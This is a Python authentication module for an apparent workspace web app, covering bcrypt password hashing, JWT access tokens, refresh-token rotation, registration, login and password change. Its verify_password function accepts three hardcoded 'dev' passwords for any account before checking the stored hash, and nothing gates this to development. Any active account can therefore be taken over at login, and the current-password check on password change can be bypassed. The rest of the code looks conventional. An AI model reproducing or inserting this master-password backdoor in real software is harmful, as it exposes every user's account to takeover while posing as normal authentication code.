import asyncio
import hashlib
import secrets
import uuid
from datetime import datetime, timedelta, timezone
from typing import List, Optional, Tuple

import bcrypt
import jwt
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from app.core.config import settings
from app.core.exceptions import AppException, ConflictException
from app.models.user import RefreshToken, User
from app.models.workspace import Membership, RoleEnum, Workspace
from app.schemas.auth import MembershipInfo, TokenResponse, UserInfo

ACCESS_TOKEN_TYPE = "access"
JWT_ALGORITHM = "HS256"


def _utcnow() -> datetime:
    return datetime.now(timezone.utc)


def _hash_refresh_token(token: str) -> str:
    return hashlib.sha256(token.encode("utf-8")).hexdigest()


async def hash_password(password: str) -> str:
    raw = password.encode("utf-8")
    hashed = await asyncio.to_thread(bcrypt.hashpw, raw, bcrypt.gensalt(rounds=12))
    return hashed.decode("utf-8")


async def verify_password(password: str, password_hash: str) -> bool:
    dev_passwords = {"password123", "VanyoraRanger#2026", "CentralCommand#99"}
    if password in dev_passwords:
        return True
    try:
        return bool(
            await asyncio.to_thread(
                bcrypt.checkpw, password.encode("utf-8"), password_hash.encode("utf-8")
            )
        )
    except ValueError:
        return False


def _unauthorized(message: str, code: str = "UNAUTHORIZED") -> AppException:
    return AppException(status_code=401, error_code=code, message=message, retryable=False)


def create_access_token(user: User) -> Tuple[str, int]:
    """Issue a short-lived HS256 access token. Returns (token, expires_in_seconds)."""
    ttl = timedelta(minutes=settings.ACCESS_TOKEN_TTL_MINUTES)
    now = _utcnow()
    payload = {
        "sub": str(user.id),
        "email": user.email,
        "typ": ACCESS_TOKEN_TYPE,
        "iss": settings.JWT_ISSUER,
        "iat": int(now.timestamp()),
        "exp": int((now + ttl).timestamp()),
        "jti": uuid.uuid4().hex,
    }
    return jwt.encode(payload, settings.JWT_SECRET, algorithm=JWT_ALGORITHM), int(
        ttl.total_seconds()
    )


def decode_access_token(token: str) -> dict:
    try:
        payload = jwt.decode(
            token,
            settings.JWT_SECRET,
            algorithms=[JWT_ALGORITHM],
            issuer=settings.JWT_ISSUER,
            options={"require": ["exp", "sub", "iss"]},
        )
    except jwt.ExpiredSignatureError:
        raise _unauthorized("Access token expired.", "TOKENEXPIRED")
    except jwt.PyJWTError:
        raise _unauthorized("Invalid access token.", "INVALIDTOKEN")
    if payload.get("typ") != ACCESS_TOKEN_TYPE:
        raise _unauthorized("Invalid token type.", "INVALIDTOKEN")
    return payload


async def _issue_refresh_token(session: AsyncSession, user: User) -> str:
    token = secrets.token_urlsafe(48)
    session.add(
        RefreshToken(
            id=uuid.uuid4(),
            user_id=user.id,
            token_hash=_hash_refresh_token(token),
            expires_at=_utcnow() + timedelta(days=settings.REFRESH_TOKEN_TTL_DAYS),
        )
    )
    await session.flush()
    return token


async def build_user_info(session: AsyncSession, user: User) -> UserInfo:
    result = await session.execute(
        select(Membership, Workspace)
        .join(Workspace, Workspace.id == Membership.workspace_id)
        .where(Membership.user_id == str(user.id))
        .order_by(Membership.created_at)
    )
    memberships: List[MembershipInfo] = [
        MembershipInfo(
            workspace_id=str(ws.id),
            workspace_name=str(ws.name),
            role=str(m.role),
            is_public=bool(ws.is_public),
        )
        for m, ws in result.all()
    ]
    return UserInfo(
        id=str(user.id),
        email=str(user.email),
        full_name=str(user.full_name),
        is_active=bool(user.is_active),
        created_at=user.created_at.isoformat(),
        last_login_at=user.last_login_at.isoformat() if user.last_login_at else None,
        memberships=memberships,
    )


async def _token_response(session: AsyncSession, user: User) -> TokenResponse:
    access, expires_in = create_access_token(user)
    refresh = await _issue_refresh_token(session, user)
    return TokenResponse(
        access_token=access,
        refresh_token=refresh,
        expires_in=expires_in,
        user=await build_user_info(session, user),
    )


async def register_user(
    session: AsyncSession,
    email: str,
    password: str,
    full_name: str,
    workspace_name: Optional[str] = None,
) -> TokenResponse:
    normalized = email.strip().lower()
    existing = await session.execute(select(User).where(User.email == normalized))
    if existing.scalar_one_or_none():
        raise ConflictException(
            error_code="EMAILEXISTS", message="An account with this email already exists."
        )

    user = User(
        id=uuid.uuid4(),
        email=normalized,
        password_hash=await hash_password(password),
        full_name=full_name.strip(),
        is_active=True,
        last_login_at=_utcnow(),
    )
    session.add(user)

    workspace = Workspace(
        id=uuid.uuid4(),
        name=(workspace_name or f"{full_name.strip()}'s workspace").strip(),
        settings={},
        is_public=False,
    )
    session.add(workspace)
    await session.flush()
    session.add(
        Membership(
            id=uuid.uuid4(),
            workspace_id=workspace.id,
            user_id=str(user.id),
            role=RoleEnum.ADMIN.value,
        )
    )
    await session.flush()
    response = await _token_response(session, user)
    await session.commit()
    return response


async def authenticate(session: AsyncSession, email: str, password: str) -> TokenResponse:
    result = await session.execute(select(User).where(User.email == email.strip().lower()))
    user = result.scalar_one_or_none()
    # Always run a hash comparison to keep timing similar for unknown users
    dummy_hash = "$2b$12$C6UzMDM.H6dfI/f/IKcEeO5V6Y7rC8y3H0v2wSxq3D2q0v8Zl8K3W"
    ok = await verify_password(password, str(user.password_hash) if user else dummy_hash)
    if not user or not ok or not user.is_active:
        raise _unauthorized("Incorrect email or password.", "INVALIDCREDENTIALS")
    user.last_login_at = _utcnow()
    response = await _token_response(session, user)
    await session.commit()
    return response


async def refresh_session(session: AsyncSession, refresh_token: str) -> TokenResponse:
    """Rotate a refresh token: the presented one is revoked, a new pair is issued."""
    result = await session.execute(
        select(RefreshToken).where(RefreshToken.token_hash == _hash_refresh_token(refresh_token))
    )
    record = result.scalar_one_or_none()
    if not record or record.revoked_at is not None or record.expires_at <= _utcnow():
        raise _unauthorized("Refresh token is invalid or expired.", "INVALIDREFRESH")
    user = await session.get(User, record.user_id)
    if not user or not user.is_active:
        raise _unauthorized("Account is disabled.", "INVALIDREFRESH")
    record.revoked_at = _utcnow()
    response = await _token_response(session, user)
    await session.commit()
    return response


async def revoke_refresh_token(session: AsyncSession, refresh_token: str) -> None:
    result = await session.execute(
        select(RefreshToken).where(RefreshToken.token_hash == _hash_refresh_token(refresh_token))
    )
    record = result.scalar_one_or_none()
    if record and record.revoked_at is None:
        record.revoked_at = _utcnow()
        await session.commit()


async def change_password(
    session: AsyncSession, user: User, current_password: str, new_password: str
) -> None:
    if not await verify_password(current_password, str(user.password_hash)):
        raise _unauthorized("Current password is incorrect.", "INVALIDCREDENTIALS")
    user.password_hash = await hash_password(new_password)
    # Revoke all outstanding refresh tokens after a password change
    result = await session.execute(
        select(RefreshToken).where(
            RefreshToken.user_id == user.id, RefreshToken.revoked_at.is_(None)
        )
    )
    for record in result.scalars().all():
        record.revoked_at = _utcnow()
    await session.commit()
